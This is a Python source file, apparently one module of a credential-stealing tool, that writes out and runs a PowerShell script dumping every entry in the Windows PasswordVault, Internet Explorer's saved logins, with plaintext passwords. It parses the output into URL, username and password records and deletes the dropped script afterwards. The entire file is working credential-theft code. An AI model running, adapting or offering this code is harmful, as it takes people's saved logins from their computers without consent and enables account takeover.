import subprocess
import os

# IE10
class ie():
    def get_login_data(self):
        powershell='''
function get_password{
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $vault = New-Object Windows.Security.Credentials.PasswordVault
    $result=($vault.RetrieveAll() | % { $_.RetrievePassword();$_ }) 
    foreach($item in $result){
        Write-Host ($item.resource)
        Write-Host ($item.username)
        Write-Host ($item.password)
    }
}
get_password
        '''
        powershell_file = open("ie.ps1", 'w')
        powershell_file.write(powershell)
        powershell_file.close()
        command='powershell ./ie.ps1'
        p = subprocess.Popen(args=command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
        #p = subprocess.Popen(args=command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
        output_bytes=p.communicate()[0]
        try:
            output_str=str(output_bytes,encoding="utf-8")
            output_list=output_str.split('\n')
        except:
            return False

        try:
            os.remove('ie.ps1')
        except:
            pass
        return output_list

    def return_result(self, browser, login_data):
        desc=browser+" Passwords Data"
        result={}
        result['desc']=desc
        data=[]
        for item in [login_data[i:i + 3] for i in range(0, len(login_data), 3)]:  # 列表生成式
            if item[0]:
                data_item={}
                data_item['url']=item[0]
                data_item['username']=item[1]
                data_item['password']=item[2]
                data.append(data_item)
        result['data']=data
        return result

    def run(self,target_list):
        result=[]
        if 'IE' in target_list:
            login_data=self.get_login_data()
            if login_data:
                ie_result=self.return_result('IE',login_data)
                result.append(ie_result)
        return result